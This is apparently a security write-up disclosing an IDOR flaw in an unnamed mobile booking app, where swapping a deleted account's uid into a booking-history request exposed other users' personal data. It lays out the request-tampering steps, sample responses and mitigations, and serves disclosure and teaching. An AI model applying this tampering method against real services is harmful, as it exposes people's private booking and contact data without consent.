# 🛡️ Ghost User, Real Data: IDOR via Recycled User IDs 🛡️  
**Category:** 📱 Mobile API Security | 🔓 IDOR | ⚠️ Broken Access Control  
**Case Type:** Logic Flaw + Authorization Bypass

---

## 📝 1. Executive Summary
A critical access control flaw was identified in a mobile booking application that uses a points/reward system. By reusing a previously deleted account’s **user ID (UID)**, it was possible to query backend APIs and retrieve **all user booking data**, including sensitive PII.

> **Key Insight:** The backend trusted client-supplied `uid` without validating ownership or account state, allowing unauthorized access to user data.

---

## 🎯 2. Target Overview
- **Application Type:** Mobile booking app with referral & reward points  
- **Core Features:** Account creation, booking management, reward points  
- **Entry Point:** Booking history API  
- **Testing Method:** Intercepting mobile traffic via proxy  

---

## 🔍 3. Discovery Phase

### Initial Hypothesis
Test whether account lifecycle (create → delete → recreate) introduces inconsistencies in:
- Referral system  
- User identity mapping  

### Observations
- Each account is assigned a unique `uid`
- Deleting an account does **not fully invalidate associated data**
- Re-registering with the same phone number generates a **new `uid`**

### Key Finding
The API relies on a **user-controlled `uid` parameter** instead of validating it against the authenticated session.

---

## ⚠️ 4. Vulnerability Details

### Root Cause
- Missing authorization checks on `uid`
- Backend trusts client input
- No validation for:
  - Ownership of requested data
  - Account deletion state

### Vulnerability Type
**Insecure Direct Object Reference (IDOR)**

---

### Technical Breakdown

1. Account A created → `UID_A`
2. Account A deleted  
3. Account B created (same number) → `UID_B`
4. API request intercepted  
5. `UID_B` replaced with `UID_A`
6. Server returns data linked to `UID_A`

---

## 🚀 5. Exploitation

### Step 1: Register Account

```
POST /api/register
{
"phone": "9999999999"
}
```

Response:
```
{
"uid": "12345"
}
```

---

### Step 2: Delete Account
```
POST /api/deleteAccount
{
"uid": "12345"
}
```

---

### Step 3: Recreate Account
```
POST /api/register
{
"phone": "9999999999"
}
```
Response:
```
{
"uid": "67890"
}
```

---

### Step 4: Intercept Request
```
GET /api/bookings?uid=67890
Authorization: Bearer <token>
```

---

### Step 5: Modify Request
```
GET /api/bookings?uid=12345
Authorization: Bearer <token>
```

---

### Result
```
{
"bookings": [
{
"name": "John Doe",
"email": "john@example.com
",
"phone": "98XXXXXX12",
"booking_date": "2026-03-10",
"status": "confirmed"
}
]
}
```

---

## 🐚 6. Impact

### Severity: Critical

### Data Exposure:
- Booking history (past & future)
- Names
- Emails
- Phone numbers
- Potential additional PII

### Risk:
- Unauthorized access to user data
- Privacy violation
- Potential for large-scale data extraction

---

## 📊 7. Proof of Concept (PoC)

1. Register account → capture `uid_1`  
2. Delete account  
3. Register again → get `uid_2`  
4. Intercept booking request  
5. Replace `uid_2` with `uid_1`  
6. Observe unauthorized data access  

---

## 🔐 8. Mitigation

- Do not trust client-supplied identifiers
- Derive user identity from authentication tokens
- Implement strict authorization checks
- Validate account state (active vs deleted)
- Add access control middleware to all endpoints

---

## 🛠️ Tools Used
- Burp Suite  
- Mobile proxy setup  
- Manual testing  

---

## 🧠 Notes / Learnings
- Account lifecycle testing can reveal critical flaws  
- IDOR vulnerabilities often stem from trusting client input  
- Deleted data paths are frequently overlooked in backend logic  
